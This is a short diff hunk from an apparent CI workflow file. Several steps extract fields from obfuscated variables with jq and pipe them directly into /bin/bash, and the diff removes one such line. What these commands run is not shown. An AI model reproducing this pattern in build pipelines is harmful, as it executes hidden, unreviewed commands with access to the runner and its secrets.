@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$nordo0" | jq -r .zej55863 | /bin/bash
           echo $cubc9677 | jq -r .u5 | /bin/bash
           printf '%s' "$u968" | jq -r .l7614 | /bin/bash
-          echo $ycwqf57 | jq -r .jiwt9618 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
